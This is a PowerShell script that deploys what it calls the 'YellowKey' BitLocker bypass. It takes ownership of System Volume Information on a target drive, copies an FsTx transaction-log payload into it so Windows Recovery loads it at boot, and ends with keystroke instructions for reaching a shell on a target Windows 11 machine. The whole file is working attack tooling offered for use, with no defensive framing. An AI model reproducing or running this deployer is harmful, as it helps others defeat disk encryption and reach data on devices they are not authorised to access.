#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Deploys the YellowKey BitLocker bypass artifacts to a target drive.

.DESCRIPTION
    Copies the FsTx transaction log payload to the correct path on a USB drive
    or EFI partition so it is picked up by WinRE on the next boot.

.PARAMETER TargetDrive
    Drive letter of the target volume (e.g. "E:" or "E"). Defaults to
    interactive selection from available drives.

.PARAMETER Eject
    After deployment, safely eject the target drive (USB only).

.EXAMPLE
    .\deploy.ps1 -TargetDrive E:
    .\deploy.ps1                   # interactive drive picker
#>

param(
    [string]$TargetDrive,
    [switch]$Eject
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# -- helpers ------------------------------------------------------------------

function Write-Step { param([string]$Msg) Write-Host "  $Msg" -ForegroundColor Cyan }
function Write-Ok   { param([string]$Msg) Write-Host "  [OK] $Msg" -ForegroundColor Green }
function Write-Fail { param([string]$Msg) Write-Host "  [!!] $Msg" -ForegroundColor Red; exit 1 }

function Select-Drive {
    $drives = @(Get-PSDrive -PSProvider FileSystem |
                Where-Object { $_.Root -match '^[A-Z]:\\' -and $_.Name -ne 'C' })

    if ($drives.Count -eq 0) { Write-Fail "No suitable drives found." }

    Write-Host ""
    Write-Host "  Available drives:" -ForegroundColor Yellow
    for ($i = 0; $i -lt $drives.Count; $i++) {
        $label = if ($drives[$i].Description) { $drives[$i].Description } else { "(no label)" }
        $free  = [math]::Round($drives[$i].Free / 1MB, 0)
        Write-Host ("    [{0}] {1}  {2}  ({3} MB free)" -f ($i + 1), $drives[$i].Root, $label, $free)
    }
    Write-Host ""

    do {
        $choice = Read-Host "  Select drive number"
    } until ($choice -match '^\d+$' -and [int]$choice -ge 1 -and [int]$choice -le $drives.Count)

    return $drives[[int]$choice - 1].Root.TrimEnd('\')
}

# -- resolve target drive -----------------------------------------------------

# $PSScriptRoot is always the directory containing this script, regardless of
# how it was invoked. $MyInvocation.MyCommand.Path can be empty when dot-sourced.
$srcFsTx = Join-Path $PSScriptRoot "FsTx"

if (-not (Test-Path $srcFsTx)) {
    Write-Fail "FsTx source directory not found at: $srcFsTx"
}

if (-not $TargetDrive) {
    Write-Host ""
    Write-Host "YellowKey -- BitLocker Bypass Deployer" -ForegroundColor Yellow
    Write-Host "======================================" -ForegroundColor Yellow
    $TargetDrive = Select-Drive
}

# Normalise: accept "E", "E:", or "E:\"
$TargetDrive = $TargetDrive.TrimEnd('\').TrimEnd(':') + ':'

if (-not (Test-Path "$TargetDrive\")) {
    Write-Fail "Drive $TargetDrive is not accessible."
}

$sviPath  = "$TargetDrive\System Volume Information"
$destRoot = "$sviPath\FsTx"

# -- permissions --------------------------------------------------------------
# On NTFS volumes System Volume Information is owned by SYSTEM. Take ownership
# and grant the current admin full control so New-Item/Copy-Item can proceed.

$fsType = (Get-Volume -DriveLetter $TargetDrive.TrimEnd(':')).FileSystem
if ($fsType -eq 'NTFS') {
    Write-Step "NTFS detected -- adjusting permissions on System Volume Information..."
    try {
        & takeown /F "$sviPath" /A | Out-Null
        & icacls "$sviPath" /grant "Administrators:(OI)(CI)F" | Out-Null
        Write-Ok "Permissions granted."
    } catch {
        Write-Fail "Failed to set permissions: $_"
    }
}

# -- deploy -------------------------------------------------------------------

Write-Host ""
Write-Host "  Target : $destRoot" -ForegroundColor Yellow
Write-Host ""

Write-Step "Creating destination directory..."
try {
    New-Item -ItemType Directory -Path $destRoot -Force | Out-Null
} catch {
    Write-Fail "Could not create destination directory: $_"
}
Write-Ok "Directory ready."

Write-Step "Copying FsTx artifacts..."
try {
    Copy-Item -Path "$srcFsTx\*" -Destination $destRoot -Recurse -Force
} catch {
    Write-Fail "Copy failed: $_"
}
Write-Ok "Artifacts copied."

Write-Step "Verifying files..."
$srcCount  = (Get-ChildItem $srcFsTx  -Recurse -File).Count
$destCount = (Get-ChildItem $destRoot -Recurse -File).Count
if ($srcCount -ne $destCount) {
    Write-Fail ("File count mismatch (src={0}, dest={1}). Check the drive." -f $srcCount, $destCount)
}
Write-Ok "$destCount file(s) verified."

# -- optional eject -----------------------------------------------------------

if ($Eject) {
    Write-Step "Ejecting $TargetDrive..."
    try {
        $shell = New-Object -ComObject Shell.Application
        # ParseName requires a trailing backslash to resolve the drive correctly
        $shell.NameSpace(17).ParseName("$TargetDrive\").InvokeVerb("Eject")
        Write-Ok "Drive ejected."
    } catch {
        Write-Fail "Eject failed: $_"
    }
}

# -- done ---------------------------------------------------------------------

Write-Host ""
Write-Host "  Deployment complete." -ForegroundColor Green
Write-Host ""
Write-Host "  Next steps:" -ForegroundColor Yellow
Write-Host "    1. Plug the drive into the target Windows 11 machine (or reinsert its disk)."
Write-Host "    2. Hold SHIFT and click Restart to enter WinRE."
Write-Host "    3. Once restart begins, release SHIFT and hold CTRL until the shell appears."
Write-Host ""
